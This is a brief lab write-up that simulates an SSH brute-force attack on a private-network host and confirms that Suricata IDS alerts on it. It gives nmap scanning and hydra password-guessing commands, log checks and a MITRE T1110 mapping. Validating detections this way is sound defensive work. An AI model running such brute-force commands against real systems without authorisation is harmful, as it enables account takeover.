# 07 - SSH Brute Force Case Study

## Objective

Simulate SSH brute force attack and validate Suricata detection.

---

## Service Discovery

```bash
nmap -p 22 192.168.200.10
```

---

## Brute Force Execution

```bash
hydra -l ubuntu -P passwords.txt ssh://192.168.200.10
```

---

## Log Validation

```bash
sudo tail -n 5 /var/log/suricata/fast.log
sudo tail -n 5 /var/log/suricata/eve.json
```

---

## Evidence

![Nmap SSH](../assets/screenshots/ssh-bruteforce/01-nmap-ssh.png)

![Hydra Execution](../assets/screenshots/ssh-bruteforce/02-hydra.png)

![fast.log SSH](../assets/screenshots/ssh-bruteforce/03-fastlog-ssh.png)

---

## MITRE ATT&CK

T1110 – Brute Force

---

## Findings

- SSH enumeration detected
- Brute force behavior logged
- IDS generated structured alert
